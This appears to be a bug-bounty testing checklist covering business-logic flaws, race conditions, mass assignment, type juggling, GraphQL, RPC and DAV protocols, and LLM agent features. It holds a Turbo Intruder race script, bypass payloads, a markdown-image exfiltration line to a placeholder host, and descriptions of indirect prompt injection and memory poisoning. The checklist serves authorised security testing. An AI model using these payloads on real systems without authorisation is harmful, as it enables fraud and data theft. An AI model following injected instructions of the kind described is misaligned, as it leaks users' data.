# Business logic, race conditions, APIs, GraphQL, LLM features

Scanners do not find these, which is why they are often the best-paid class on mature programs. Map the workflow in `map.md` first, then ask, at each step: what does the server trust that the client controls?

Tiers: **L1** changes one value the client controls. **L2** abuses the workflow — order, repetition, alternate paths, other API versions. **L3** abuses timing, parser disagreements, and multi-step state that only exists for a moment.

---

## Business logic

### Numbers and money
**L1 — Basic**
- [ ] Negative quantities, prices, transfer amounts, tips; zero.
- [ ] Price, currency, discount, or tax fields sent from the client → change them.

**L2 — Intermediate**
- [ ] `0.001` and rounding (buy 0.004 units at a price that rounds down).
- [ ] Very large values: integer overflow in quantity × price, `1e308`, values above the documented max.
- [ ] Currency switch after the price is computed (pay in a weaker currency for the same numeric amount).

**L3 — Advanced**
- [ ] Rounding/conversion loops: buy in one currency, refund or transfer in another, repeat — each round trip gains a fraction.
- [ ] Payment bound to the wrong object: pay for cheap order X, then attach the payment intent/session ID to expensive order Y.

### Coupons, credits, trials, referrals
**L1 — Basic**
- [ ] Reuse a single-use code.

**L2 — Intermediate**
- [ ] Apply the same code twice in one cart; stack codes that should not stack.
- [ ] Apply a code meant for another plan, region, or account.
- [ ] Referral credit for self-referral via email aliases (often excluded — check policy).
- [ ] Gift card / credit balance: transfer to self, refund to a different method, cancel after use.

**L3 — Advanced**
- [ ] Race the redemption (single-packet, below).
- [ ] Partial refunds and cancellations after a discount: is the refund computed on the pre-discount price?

### Workflow and state
**L1 — Basic**
- [ ] Skip steps: call the final step's endpoint directly (checkout without payment, publish without review, access without KYC).
- [ ] **A client-held permission flag is a UI decision, not a control.** Where a response carries `canEdit`, `canDelete`, `isAdmin`, `isOwner`, `isPremium` or an `actions: []` list, send the action the flag denies. The flag tells you the developer thought about the UI; it says nothing about whether the handler repeats the check. Every such flag in `map.md` → Client-only gates gets one request.

**L2 — Intermediate**
- [ ] **A new flow against an old control.** A verification or limit enforced in the original path is often absent from a flow added later: an upgrade path that accepts a payment instrument the signup path would have required a phone number for, a new onboarding that skips KYC, a second checkout that does not re-check eligibility. Take each control the app enforces somewhere and ask which *later-built* path reaches the same state without it — `surfaces.md`'s **era** axis is the list, and the control's absence is in `filters.md` → *Siblings that lack it*.
- [ ] Repeat steps: replay the "payment succeeded" callback; replay the "approve" action.
- [ ] Reorder steps: change the cart after payment authorisation but before capture.
- [ ] Cancelled/expired/suspended states still allow actions (cancelled subscription keeps premium features via API, deleted user's API key still works).

**L3 — Advanced**
- [ ] Payment provider callbacks: are webhooks signed and verified? Is the amount and currency in the callback compared to the order?
- [ ] Mid-flow changes: alter an earlier step's input after a later step has locked something in (`h1-invariant-hunt` → time disagreement).

### Limits and quotas
**L1 — Basic**
- [ ] Limits enforced in the UI only.

**L2 — Intermediate**
- [ ] Seat limits, project limits, storage quotas, invite limits, free-tier limits → exceed them via the API, older API versions, or by deleting and recreating.

**L3 — Advanced**
- [ ] Exceed them with parallel requests (next section).

### Entitlements and plans
Paid features reached from a free account are often rated low on their own. Report them with the plan's price and what was consumed, or when the gated feature is itself a security control (SSO enforcement, audit logs, IP allowlists, data retention). Use your own accounts only.

**L1 — Basic**
- [ ] Call paid-tier endpoints directly from a free account — the UI hides the button, but does the API refuse?
- [ ] Plan fields the client sends (`plan`, `tier`, `features`, `seats`, `trial_ends_at`) → change them.
- [ ] **Flip a disabled feature flag and ask the back end, not the UI.** Bundles and config
  responses carry unreleased features (`"enabled": false`, `beta`, `comingSoon`,
  `isGated`, a flag list in a `/config` or `/bootstrap` call). Flip the value with Burp
  Match & Replace and use the feature: if the server serves it, the gate was a UI decision
  about something already shipped — and an unreleased feature has had the least review of
  anything on the target. Record each flag in `map.md` → Client-only gates and each
  unreleased endpoint it exposes as its own tracker row.

**L2 — Intermediate**
- [ ] Downgrade or cancel, then keep using the paid feature: API keys, integrations, exports, and scheduled jobs created on the higher plan; entitlements cached in a JWT claim or session.
- [ ] Trial reset: delete and recreate the workspace, restart the trial through another endpoint, or set `trial_ends_at` via mass assignment.
- [ ] Entitlement scoped to the wrong level: a feature bought by B's org reached from A's free org by switching org context (path, `X-Org-Id`, subdomain).
- [ ] Older API versions and the mobile API that skip the entitlement check.

**L3 — Advanced**
- [ ] Checked at creation, not at use: create the resource while entitled (during the trial), downgrade, then keep using it — including through background jobs and webhooks.
- [ ] Plan bound to the wrong checkout: start checkout for the cheap plan, then complete it against the expensive plan's ID; or a payment-provider webhook whose plan or price ID the server does not compare with what was bought.
- [ ] Downgrade and feature use in one single-packet group (race section below).

### Account lifecycle
**L2 — Intermediate**
- [ ] Delete account → is the data deleted? Does re-registering with the same email restore access to old org data?
- [ ] Ownership transfer of orgs/projects to a user who did not accept it.
- [ ] Leave org → access to org resources through links, shared files, webhooks, or API keys created earlier.

**L3 — Advanced**
- [ ] Soft-deleted objects: restore/undelete endpoints, or old IDs still served by export, search, or GraphQL `node(id:)`.

## Race conditions (limit overrun, TOCTOU)
`harness.py race --engagement $P --label A --kind attack --n 20 --sync last-byte <url>` is
the sender: N connections opened, the final byte of every request withheld until all of them
are through the handshake, then released together — the spread of N TLS handshakes is wider
than most of these windows, which is why a loop proves nothing. One transcript per response
plus a summary table. The ceiling is 64 and it refuses on an endpoint that has already
answered a throttle unless a control is already beside it. For a **multi-endpoint**
race - transfer and close together, accept and revoke, two admins demoting each other -
put one row per leg in a JSONL file and pass `--file`: each row carries its own method,
url and body, and they share the one barrier. `--n` is the single-request case.
Targets: redeem coupon/gift card, withdraw/transfer balance, vote/like/follow, invite acceptance, MFA/OTP verification (attempt-limit bypass), file processing, "one per user" actions, email change + verification.

Proof at every tier: the resulting state (balance, number of redemptions) shown before and after, with the response table. Use the smallest balance/coupon value that shows the effect, keep the run count low, and record N successes out of M attempts.

**L2 — Intermediate**
- [ ] **Burp Repeater:** duplicate the request 20–30 times into a tab group → "Send group in parallel (single-packet attack)" (HTTP/2).

**L3 — Advanced**
- [ ] **Turbo Intruder** single-packet attack:
  ```python
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2
                             )
      for i in range(20):
          engine.queue(target.req, gate='race1')
      engine.openGate('race1')

  def handleResponse(req, interesting):
      table.add(req)
  ```
  HTTP/1.1-only targets: `Engine.THREADED` with the same gate gives last-byte synchronisation.
- [ ] Connection warming: put a harmless request at the start of the group so connection setup does not delay the first real request.
- [ ] **Multi-endpoint races:** send request A (e.g., "change email to a@x") and request B (e.g., "confirm email with token") in the same packet — the token can be issued for one value and applied to the other.
- [ ] **Partial construction:** an object is inserted, then completed by a second query (user created, then `api_key`/`token` set). In the gap the field is empty. Race the creation against a request that looks up by that field with an empty value (`token=`, `token[]=`, `{"token":null}`).
- [ ] **Time-derived collisions:** two tokens generated in the same instant (resets for A and B in one packet) come out identical or related.

## Idempotency and replay
Targets: charges and payments, transfers, refunds, order creation, coupon or credit grants, invite sends, incoming webhooks, and any endpoint that accepts an `Idempotency-Key` header.

Proof: before/after state on your own objects, the smallest amount that shows the effect, at most five replays. Use the program's test payment mode if it offers one, and refund or reverse every test charge.

**L1 — Basic**
- [ ] Replay a successful one-time request (create order, redeem, refund, grant credit) sequentially. Does it apply twice?

**L2 — Intermediate**
- [ ] `Idempotency-Key` handling: remove it; reuse the same key with a different body (amount, recipient) — does the server apply the new body, or correctly return the first response? A fresh key creating a fresh effect is expected; what matters is whether a one-time action has its own server-side guard.
- [ ] Webhook receivers: replay the same provider event. Is the event ID deduplicated, and is the signature checked (workflow section above)?
- [ ] Refund and cancel replay: refund the same charge twice; cancel after a partial refund.

**L3 — Advanced**
- [ ] Key scope: is the key scoped to the user? Send A's request with a key B already used. If the server returns B's cached response or attaches A's action to B's record, that is a cross-user leak — test it with your own two accounts.
- [ ] Same key, concurrent requests (single-packet): the duplicate check runs before the first write commits, so both execute.
- [ ] Key retention: replay after the key has been pruned (Stripe, for example, keeps keys for 24 hours) → a second effect.
- [ ] Predictable keys built from timestamps or order numbers that collide with another user's operation.

## Mass assignment
**L1 — Basic**
- [ ] Add privilege fields to update requests: `role`, `is_admin`, `isStaff`, `plan`, `credits`.

**L2 — Intermediate**
- [ ] Compare the fields the API **returns** for an object with the fields the UI **sends** on update. Send every returned field back with a modified value: `role`, `is_admin`, `isStaff`, `permissions`, `org_id`, `owner_id`, `email_verified`, `plan`, `credits`, `balance`, `price`, `status`, `approved`.
- [ ] Nested objects: `{"user":{"role":"admin"}}`, `{"profile":{"user_id":B}}`.
- [ ] Rails/Laravel/Django parameter naming: `user[role]=admin`.

**L3 — Advanced**
- [ ] Nested relation writes: Rails `accepts_nested_attributes_for` (`user[memberships_attributes][0][role]=owner`), Prisma-style relation operations (`{"org":{"connect":{"id":"<B org>"}}}`).
- [ ] Type juggling: `"is_admin":"true"` vs `true` vs `1` vs `["true"]` — validation and persistence may coerce differently. Secret checks: *Type confusion and loose comparison* below.
- [ ] JSON parser differentials: duplicate keys (`{"role":"user","role":"admin"}`), Unicode-escaped keys (`{"r\u006fle":"admin"}`) — the validator reads one value, the model another.

## Type confusion and loose comparison
Secret checks — OTPs, reset, invite, and magic-link tokens, coupon and gift codes, CSRF tokens, passwords, webhook signatures — written with loose equality or a truthiness test accept a value of the wrong type. A JSON body lets the client pick the type.

Proof: the resulting state on your own B (logged in, code accepted, token consumed), not just a `200`.

**L1 — Basic**
- [ ] Send each secret field as every other JSON type: `true`, `0`, `null`, `""`, `[]`, `{}`, `["<a value in the right format>"]`. Form-encoded: `code[]=x`, `code=`, the field omitted.

**L2 — Intermediate**
- [ ] **Null matches null:** an account with nothing pending stores `null` for the token or code, so `submitted == stored` is true for a submitted `null` or a missing field, in any language. Test against B with no reset, invite, or code pending: `{"email":"<B's address>","token":null}`.
- [ ] **PHP loose comparison** (`map.md` → Frameworks: PHP, Laravel, Symfony, WordPress; version from `X-Powered-By` or error pages). `==`, `!=`, `switch`, and non-strict `in_array`/`array_search` decide which payloads can work:
  ```
  Comparison                        PHP 7.x                 PHP 8.x
  true == "any non-empty string"    true                    true         → {"code":true}
  0 == "abc"                        true                    false        → {"code":0}
  null == ""                        true                    true         → {"code":null} against an empty stored value
  in_array("abc", [0])              true                    false
  strcmp([], "secret") == 0         true (NULL + warning)   TypeError → 500
  "1e3" == "1000"                   true                    true         (numeric strings compare as numbers)
  ```
  Check a row locally before relying on it: `php -r 'var_dump(0 == "abc");'`.
- [ ] Framework validation usually forces strings (`'code' => 'required|string'`); the paths it misses are legacy controllers, plugins, webhook receivers, and custom auth code.

**L3 — Advanced**
- [ ] **Magic hashes:** hashes compared with `==` treat any two `0e<digits>` strings as equal — `md5("240610708") == md5("QNKCDZO")` is true in PHP 7 and 8. It only bites when the stored side is itself such a hash, so it is rare: prove on B by setting B's value to one preimage and authenticating with the other, and grade it by what the code path shows, not by the class.
- [ ] Other stacks: JavaScript `==` coerces (`["x"] == "x"`, `0 == ""`, `null == undefined`). Python and Ruby compare strictly; look instead for truthiness branches such as `if submitted and submitted != stored: reject`, which passes an empty or missing value.

## REST API
**L1 — Basic**
- [ ] Every operation in the spec, as each role and as anonymous.
- [ ] Excessive data exposure: responses that include fields the UI hides (`password_hash`, `email`, `phone`, `internal_notes`, `api_key`, other users' data in nested objects).

**L2 — Intermediate**
- [ ] HTTP verb tampering: `GET`→`POST`/`PUT`/`PATCH`/`DELETE`; `X-HTTP-Method-Override`, `_method=DELETE`.
- [ ] Content-type switching: JSON ↔ form ↔ XML ↔ multipart (different parsers, different validation paths).
- [ ] API versions: the old version lacks the newer authorization checks.
- [ ] Filtering/expansion parameters: `?fields=`, `?include=`, `?expand=`, `?populate=` → pull in related objects you should not see.
- [ ] API keys: scope enforcement (a read-only key can write), keys survive user removal, keys visible to other org members.

**L3 — Advanced**
- [ ] **Server-side parameter pollution:** a value you send is embedded into an internal API request. Inject structure into it and watch for a changed response (an extra field, a different error, `Invalid route`):
  - query string: `name=b%26role=admin`, `name=b%26name=a`, `name=b%23` (truncates the rest)
  - REST path: `name=..%2f..%2fadmin`, `id=123%2f..%2f456`
  - JSON: `"name":"b\",\"role\":\"admin"`
- [ ] Pagination/limits: `?limit=` raised to fetch other tenants' data via a broken filter; do not send values meant to exhaust the server.
- [ ] Large numbers and precision: IDs above 2^53 are rounded by JavaScript clients and some parsers — two different IDs can collide.

## GraphQL
Tools: InQL, `graphql-cop`, `clairvoyance`, GraphQL Voyager for visualising the schema.

**L1 — Basic**
- [ ] Introspection enabled in production (informational alone; use it to map).
- [ ] Hidden/admin mutations and queries in the schema, called as a regular user.

**L2 — Intermediate**
- [ ] Field suggestions ("Did you mean …?") leak the schema when introspection is off.
- [ ] Authorization per resolver: query the same object through different paths (`user(id:)`, `node(id:)`, `org { members { … } }`, search) — one path often lacks the check.
- [ ] Mutations that skip checks that the REST equivalent enforces.
- [ ] CSRF: GraphQL accepting `GET` queries or `application/x-www-form-urlencoded`/`text/plain` with cookie auth.
- [ ] Injection through arguments into backing SQL/NoSQL/REST calls (`vectors-injection.md`).
- [ ] **Alias authorization differential:** aliases ask for the same field many times in one operation — `mine: invoice(id:"<A's>") { total } theirs: invoice(id:"<B's>") { total }`. Compare the result and error per alias. Authorization done once per operation, or only on the first object resolved, returns B's data next to A's; a `FORBIDDEN` on the `theirs` alias alone is the secure result. Send the pair in both orders.
- [ ] Field-level authorization: request a sensitive field directly, inside a fragment, and under an alias. Schema directives such as `@auth` or `@hasRole` decorate one field definition; the same data reached through another type or interface can lack them.

**L3 — Advanced**
- [ ] Batching for brute force: array batching `[{query…},{query…}]` or aliases `a1: login(…) a2: login(…)` to bypass per-request rate limits on OTP/login (prove with a small batch).
- [ ] Fragments on interfaces/unions (`... on AdminUser { … }`) to reach fields of a concrete type the parent resolver did not expect to expose.
- [ ] **Persisted queries.** Two mechanisms share the name:
  - *Automatic persisted queries* (Apollo APQ): the client sends `extensions.persistedQuery.sha256Hash`; on `PersistedQueryNotFound` it resends the full query, and the server stores it under that hash. Any client can register any query this way, so APQ is a cache, not an allowlist — an app that relies on it to restrict operations accepts arbitrary queries.
  - *Trusted documents* (operation allowlists): only pre-registered hashes run. Send an arbitrary query with no hash, with a new hash, and with a registered hash plus a different `query` string; the last shows whether the server checks that the text matches the hash or runs what you sent.
  - Either way, the hashes and operation names in client bundles list operations the UI never calls. Admin or internal ones are BFLA candidates: run them with A's token.
- [ ] Subscriptions: subscribe to B's events over the websocket transport; authorization is often checked at connect time only.
- [ ] **Cost and rate accounting:** find out what the server counts — HTTP requests, operations, root fields, aliases, or cost points (some APIs report it in `extensions.cost`, a `rateLimit { cost remaining }` field, or throttle headers). A count that ignores aliases or batched operations turns a per-request limit on a secret check into many guesses per request; that is the finding (*Batching* above). Read the limits with modest queries.
- [ ] **Directives:** list them (`{ __schema { directives { name locations args { name } } } }`). Any beyond `@include`, `@skip`, `@deprecated`, and `@specifiedBy` is server code that takes your input; test its arguments like any other. Incremental delivery (`@defer`, `@stream`): fetch a field normally and inside a deferred fragment — deferred parts resolve later and sometimes outside the original authorization context. Repeated or overloaded directives are availability-only: out.
- [ ] Depth/complexity limits: check whether they exist with a modest nested query; do not send queries designed to exhaust the server (DoS is out of scope almost everywhere).

## Protocols and RPC channels
Every channel besides the main REST API is a second door to the same objects, and its authorization usually lags. Map them in P1 (`recon.md` §8) and run the IDOR and BFLA methods from `vectors-auth.md` through each.

### WebSockets, Socket.IO, and Server-Sent Events
**L2 — Intermediate**
- [ ] Replay and modify websocket frames in Burp: object IDs, role fields, channel/room names (subscribe to B's channel).
- [ ] Authorization at connect time only: open the socket as B, then log B out, remove B from the org, or lower B's role in another session. Does the open socket keep receiving events or accepting actions?
- [ ] Channel names built from IDs: join `org:<B>` or `user:<B>` rooms (Socket.IO, Action Cable, Phoenix). For Pusher/Ably-style private channels, ask the app's channel-auth endpoint (`/pusher/auth`, `/broadcasting/auth`) to sign a channel name carrying B's ID.
- [ ] Server-Sent Events (`text/event-stream`) with channel or user parameters: swap them as A; check CORS with credentials (`vectors-client.md` → CORS).

**L3 — Advanced**
- [ ] GraphQL over WebSocket (`graphql-ws`, `subscriptions-transport-ws`): the token is read once from `connection_init`, and subscription arguments decide whose events arrive — subscribe with B's IDs (GraphQL → Subscriptions above).
- [ ] Frames the UI never sends: other `action`/`type` values from the bundle, extra fields (mass assignment over the socket), type changes (`5` vs `"5"` vs `[5]`).
- [ ] Transport fallbacks and websocket smuggling: `vectors-client.md` → CSWSH.

### gRPC and gRPC-Web
**L2 — Intermediate**
- [ ] Decode with Burp extensions (`blackboxprotobuf`), then apply the same IDOR and injection tests.
- [ ] Method paths are `/<package>.<Service>/<Method>`. Collect names from the client bundle or app binary and call the ones the UI never uses, as A and as anonymous.

**L3 — Advanced**
- [ ] gRPC server reflection enabled: `grpcurl <host>:<port> list` / `describe` to map services the client never calls.
- [ ] Protobuf unknown fields: add field numbers the client never sends but the server message defines (the protobuf equivalent of mass assignment).
- [ ] Metadata the gateway is meant to set (`x-user-id`, `x-tenant-id`): send it yourself (`vectors-frameworks.md` → Front-end servers, identity headers).

### WebDAV, CalDAV and CardDAV

A `caldav.`, `dav.`, `carddav.` or `webdav.` host, or a "connect your calendar / contacts /
files with any client" feature, is a **second, protocol-level implementation of data the main
API already serves** — with its own parser, its own authentication and its own ACL model. It is
usually built once, early, by whoever added standards support, and then left alone; almost
nobody tests it. On a product whose calendar or file data is the asset, this is one of the
highest-value-per-hour surfaces in scope.

Discovery first, because the protocol tells you its own layout:
```
# the well-known endpoints redirect to the real root
curl -sI -H "$HDR" https://<host>/.well-known/caldav
curl -sI -H "$HDR" https://<host>/.well-known/carddav
# then ask the server who you are and what you own (authenticated as A)
curl -s -u 'A:<app password>' -X PROPFIND -H 'Depth: 0' -H 'Content-Type: application/xml' \
     --data '<?xml version="1.0"?><d:propfind xmlns:d="DAV:"><d:prop>
             <d:current-user-principal/><d:principal-URL/></d:prop></d:propfind>' \
     https://<host>/ | xmllint --format -
```
`current-user-principal` gives you your own principal URL, and principal URLs are usually
constructed from a user or account identifier — which makes the next step obvious.

**L1 — Basic**
- [ ] **Authentication**: what does it accept — the web session, basic auth with the account password, or an application-specific password (`vectors-auth.md` → Application-specific passwords)? If the account password works here while the web login enforces MFA, the DAV endpoint is an MFA bypass.
- [ ] **`PROPFIND` with `Depth: 1` on your own collections** to learn the URL shape: principal, home-set, calendars or address books, individual resources. Save it — the shape is the IDOR surface.
- [ ] **Swap the principal.** Replace your identifier in a principal or home-set URL with B's and `PROPFIND` it. This is IDOR on a protocol most IDOR tooling never touches. Then the same with A's and B's app passwords, and anonymously.
- [ ] `OPTIONS` on the root: the `DAV:` and `Allow:` headers say which methods and extensions exist, including ones the product's own clients never use.
- [ ] Is a plain `GET` on a resource URL enough to read it, without the DAV machinery?

**L2 — Intermediate**
- [ ] **The ACL model.** `PROPFIND` for `current-user-privilege-set` on your own and on B's collections; if the server implements RFC 3744, try `ACL` to grant yourself a privilege on a resource you do not own. Sharing and delegation features (a delegated calendar, a shared address book) are where the grant and the enforcement are most likely to disagree.
- [ ] **Write methods, each separately**, because they are separate handlers: `PUT` a resource into B's collection, `DELETE` one, `MKCALENDAR`/`MKCOL` inside B's home-set, `MOVE` and `COPY` with a `Destination:` header pointing into B's tree. Use a marker value and confirm from B's side; restore afterwards. A `MOVE` whose `Destination` is only partially validated is the classic one.
- [ ] **`REPORT` bodies** — `calendar-query`, `calendar-multiget`, `addressbook-query`, `sync-collection`. These carry filters and a list of hrefs: put B's hrefs in a `multiget`, and put a filter the UI could not express in a query. `sync-collection` with a replayed or crafted sync token can leak deletions and history.
- [ ] **XML parsing is the attack surface the protocol hands you.** Every body here is XML, parsed server-side before any authorization runs: XXE, parameter entities, billion-laughs, and namespace confusion (`vectors-injection.md` → XXE). This is the single most likely place in a mature product to find an XXE still live, because the parser predates the hardening everywhere else.
- [ ] **Free-busy and scheduling** (`POST` to an outbox, `free-busy-query`): does it answer for principals you cannot otherwise read? A free-busy oracle across tenants is a real information-disclosure finding, and these endpoints are often deliberately laxer "because it is only availability".
- [ ] Content handling on `PUT`: an iCalendar or vCard whose fields reappear in the web UI, in an email invitation, or in another user's client — the same input, a different sink, and the DAV path often skips the web path's sanitiser.

**L3 — Advanced**
- [ ] **Scheduling as a cross-user write.** iTIP/iMIP invitation handling means a resource you create can land in another user's calendar by design. Test what you can put in one — attendee fields naming users across a tenant boundary, an organiser you are not, a recurrence that expands into a denial you must then *not* prove.
- [ ] **Locking** (`LOCK`/`UNLOCK`): a lock token taken on a resource you do not own, or a token guessable or reusable across resources.
- [ ] **Path normalisation between the front proxy and the DAV handler** — `..`, `%2f`, trailing dots, a `;` segment, a double slash inside a principal URL. The proxy's ACL and the handler's router disagreeing is the same class as a front-proxy path bypass (`vectors-server.md`, `vectors-frameworks.md` → front-end proxies), with the difference that nobody has looked here.
- [ ] Non-standard methods the `DAV:` header advertises, each tried as A against B's tree.

**Proof and limits:** A and B, both yours. One record, redacted, as the first proof of reach.
Every write uses a marker and is restored (`SKILL.md` → gate 4); `DELETE` is never the first
proof. Do not expand a recurring event to make a point about load — availability results are
out (`SKILL.md` → Usually not paid).

### SOAP, JSON-RPC, XML-RPC, and OData
**L1 — Basic**
- [ ] List the operations: `?wsdl` / `?singleWsdl` (SOAP), `system.listMethods` (XML-RPC), `rpc.discover` (OpenRPC), `$metadata` (OData). Call each operation the UI never uses, as A and as anonymous.

**L2 — Intermediate**
- [ ] **Batching:** JSON-RPC arrays, XML-RPC `system.multicall`, OData `$batch` (multipart). Many calls ride in one HTTP request: per-request rate limits count one, and proxy or WAF rules written per URL never see the inner requests. Prove with a small batch.
- [ ] **OData query options:** `$expand` into related entities the parent's permissions do not cover, `$select` of properties the UI hides, `$filter` on a hidden property as an oracle (one character, your own data).
- [ ] The gateway authorizes on the URL (`/rpc`, `/soap`, `/odata`) while the operation is named in the body: every method sits behind the same check.

**L3 — Advanced**
- [ ] **SOAPAction spoofing:** the WAF or authorization layer reads the `SOAPAction` header while the dispatcher routes on the body's first element (or the reverse) — an allowed action in the header, a forbidden operation in the body.
- [ ] WS-Security: signature wrapping and timestamp replay, as in SAML (`vectors-auth.md`); XXE in the envelope (`vectors-injection.md`).

## LLM / AI features
**L1 — Basic**
- [ ] Output handling with your own input: model output rendered as HTML (XSS), executed as SQL/code, or used in a server-side fetch (SSRF).
- [ ] System prompt disclosure and "jailbreaks" without data or action impact are usually N/A unless the program says otherwise — note and move on.
- [ ] Inventory the agent surface in `map.md`: the tools the assistant can call, the connectors users can attach (MCP servers included), and whether the product itself exposes an MCP server (a `/mcp` or `/sse` endpoint, "connect to Claude/Cursor" docs, `/.well-known/oauth-protected-resource`).

**L2 — Intermediate**
- [ ] **Indirect prompt injection:** put instructions in content the assistant will read for another user (a shared doc, a ticket, an email, a web page it browses). Impact needs a real effect: data from B's context exfiltrated, an action taken as B.
- [ ] **Data exfiltration channels:** markdown image rendering (`![](https://OAST/?d=…)`), link unfurling, tool calls that fetch URLs.
- [ ] **Tool/function abuse:** can the assistant's tools reach objects outside your permissions (IDOR through the agent)? Can it call admin-only tools?
- [ ] **The product's own MCP server is an API.** Each tool is an endpoint: run the IDOR and BFLA rows against it with A's token on B's objects and with a low role on admin-only tools. Tools often call internal services directly and skip checks the REST API makes.
- [ ] MCP authorization (OAuth 2.1 in the MCP spec): `redirect_uri` validation and consent in dynamic client registration, token audience (a token issued for the MCP server accepted by the main API, or the reverse), and `Mcp-Session-Id` bound to the user who opened the session (`vectors-auth.md` → OAuth).
- [ ] **Tool poisoning:** text in a tool's description, or in a tool's result, that the agent follows as instructions. In scope where the attacker controls that text through the product: a connector A shares into B's workspace or publishes to the product's own directory, or tool output built from data A wrote (an issue title, a file name, a calendar invite). Same impact bar as indirect injection. Keep it in a private workspace B joins; publishing to a directory other users can install waits for operator approval.

**L3 — Advanced**
- [ ] **Cross-tenant retrieval:** RAG returning documents from other orgs; embeddings/search indexes shared across tenants.
- [ ] Multi-step agent chains: injection → tool call → data leaves through a channel the product allows (creating a public share link, sending an email or webhook, writing to a field B's colleagues can read).
- [ ] Persistent memory poisoning: an injected instruction saved to the assistant's memory or a shared knowledge base keeps acting in B's later sessions.
- [ ] Changed tool definitions: when a connector's tools or descriptions change after B approved it, does the client ask again, or does the old approval cover the new text?
- [ ] Tool shadowing: one connector's description changes how the agent uses another connector's tools (routes data through A's tool, adds A as a recipient) when both are attached to B's session.
- [ ] Confirmation gaps: actions the UI says need B's confirmation (send, share, delete, pay) that run without it when injected text triggers them, or a confirmation dialog that shows arguments different from the ones executed.
- [ ] Measure reliability (N successes out of M runs) and go deeper with the `ai-agent-security` skill.
